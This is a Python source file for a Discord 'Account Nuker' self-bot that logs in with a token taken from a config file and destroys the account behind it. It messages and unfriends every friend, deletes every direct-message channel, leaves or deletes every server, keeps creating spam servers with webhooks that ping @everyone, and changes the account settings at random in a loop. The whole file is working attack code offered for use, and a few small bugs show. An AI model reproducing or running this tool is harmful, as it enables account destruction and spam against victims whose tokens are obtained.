import json
import requests
import asyncio
import os
from time import sleep
import random, string
from colorama import init, Fore; init()
import discord

bot=discord.Client()

with open('icon.png', 'rb') as f:
	icon = f.read()
with open("config.json", "r", encoding="utf-8") as f:
	config = json.load(f)
token=config['TOKEN']

jfj=0
gaif=0
RemovedFriends=0

async def RemoveFriend(user, Friends):
	await user.dm_channel.send(f"||{user.mention}|| This account was destroyed using the Account Nuker by LALOL :clown:\nhttps://github.com/Its-LALOL/Discord-Account-Nuker")
	await user.remove_friend()
	print(Fore.GREEN + f"Removed {user.name}")
	global RemovedFriends
	RemovedFriends+=1
	if RemovedFriends==len(Friends):
		for channel in bot.private_channels:
			while True:
				response=requests.delete(f"https://discord.com/api/v9/channels/{channel.id}", headers={'Authorization': token})
				if response.status_code!=401:
					break
				sleep(response.json()['retry_after'])
async def RemoveGuild(guild):
	try:
		await guild.leave()
		print(Fore.WHITE + f"Guild left {guild.name}")
		return
	except: pass
	try:
		await guild.delete()
		print(Fore.WHITE + f"Guild Delete {guild.name}")
		return
	except: pass
@bot.event
async def on_guild_join(guild):
	global jfj
	if jfj==1:
		for channel in guild.text_channels:
			webhook=await channel.create_webhook(name="Account Nuker By LALOL", reason="Account Nuker By LALOL", avatar=icon)
			for i in range(3):
				await webhook.send(content="||@everyone||", embed=embed)
async def CreateGuild():
	while True:
		name='Account Nuker By LALOL '+''.join(random.choices(string.ascii_uppercase + string.digits + string.ascii_lowercase, k=4))
		try:
			guild=await bot.create_guild(name=name, icon=icon)
			print(Fore.RED + f"Guild Created {name}")
		except:
			global gaif
			gaif=1
			break
async def ThemeChanger():
	while True:
		json={
			'theme': "light", 'locale': random.choice(['hi', 'th']),
			'custom_status': {'text': "Account Nuker By LALOL", 'emoji_name': random.choice(emojis)},
			'status': random.choice(["online", "idle", "dnd", "invisible"]),
			'message_display_compact': random.choice(['true', 'false']),
			'developer_mode': random.choice(['true', 'false']),
			'friend_source_flags': {'all': "false", 'mutual_friends': 'false', 'mutual_guilds': 'false',}
		}
		requests.patch("https://discord.com/api/v6/users/@me/settings", headers={'Authorization': token}, json=json)
		await asyncio.sleep(0.5)
		global gaif
		if gaif==1:
			print(Fore.GREEN + "The account has been successfully destroyed!")
			input()
			break
@bot.event
async def on_ready():
	input(f"\nPress Enter to start destroying account {bot.user}")
	global jfj
	jfj=1
	asyncio.create_task(ThemeChanger())
	Friends=bot.user.friends
	for user in Friends:
		asyncio.create_task(RemoveFriend(user, Friends))
	for guild in bot.guilds:
		asyncio.create_task(RemoveGuild(guild))
	asyncio.create_task(CreateGuild())
os.system(f'cls && title Account Nuker By LALOL' if os.name == 'nt' else 'clear')
print(Fore.RED +"""
██╗░░░░░░█████╗░██╗░░░░░░█████╗░██╗░░░░░
██║░░░░░██╔══██╗██║░░░░░██╔══██╗██║░░░░░
██║░░░░░███████║██║░░░░░██║░░██║██║░░░░░
██║░░░░░██╔══██║██║░░░░░██║░░██║██║░░░░░
███████╗██║░░██║███████╗╚█████╔╝███████╗
╚══════╝╚═╝░░╚═╝╚══════╝░╚════╝░╚══════╝
""")
print(Fore.GREEN + "Account Nuker By LALOL" + Fore.YELLOW)
emojis=["💥","🤡","☠️","⚠️"]
try: bot.run(token, bot=False)
except:
	print(Fore.RED)
	input("Inavlid Token!")
